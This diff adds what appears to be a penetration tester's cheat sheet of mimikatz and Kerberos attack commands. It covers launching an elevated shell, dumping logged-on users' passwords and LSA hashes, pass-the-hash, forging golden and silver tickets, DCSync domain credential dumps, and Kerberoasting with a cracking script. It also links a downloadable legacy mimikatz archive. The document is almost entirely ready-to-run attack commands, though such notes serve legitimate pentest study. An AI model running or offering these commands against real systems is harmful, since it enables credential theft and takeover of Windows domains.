@@ -1,0 +1,37 @@
+spawn privileged shell:
+	powershell.exe Start-Process cmd.exe -Verb runAs
+
+Engage/ Give SeDebugPrivilege:
+	privilege::debug
+Dump passwords of logged on users:
+	sekurlsa::logonpasswords
+	-> if you get an error with this, try using legacy version(s) in ~/Kali/Tools/windows/mimikatzLegacy OR https://github.com/caday00/mimikatz2.1.1/blob/master/mimikatz_trunk.zip
+Show current user's kerberos tickets (ideally want the TGT):
+	sekurlsa::tickets
+Convert NTLM hash to Kerberos TGT:
+	sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:Powershell.exe
+Create golden/ silver kerberos ticket(s):
+	Golden (requires NTLM hash of krbtgt account):
+		kerberos::golden /user:___ /domain:___ /sid:___ /krbtgt:<passwd hash> /ptt
+		misc::cmd
+	Silver (requires hash of user we're using for lateral movement + target hostname):
+		kerberos::golden /user:___ /domain:___ /sid:___ /target:<target hostname> /service:HTTP /rc4:<passwd hash> /ptt
+List current tickets:
+	kerberos::list
+Purge current list of tickets generated/ refresh:
+	kerberos::purge
+Full password hash dump:
+	lsadump::lsa /patch
+Sync with DC and dump domain creds (assumed: compromise of domain admin acc):
+	lsadump::dcsync /user:Administrator (specific user)
+	lsadump::dcsync /domain:<domain> /all /csv
+
+** Load IIS ticket into memory
+	PS> Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<IIS Server>'
+	Example:
+		Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+List and export current tickets onto disk:
+	kerberos::list /export
+	Move export onto kali, and use the following for brute force:
+		python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlist/rockyou.txt <exported>.kirbi
+		(or just use hashcat)
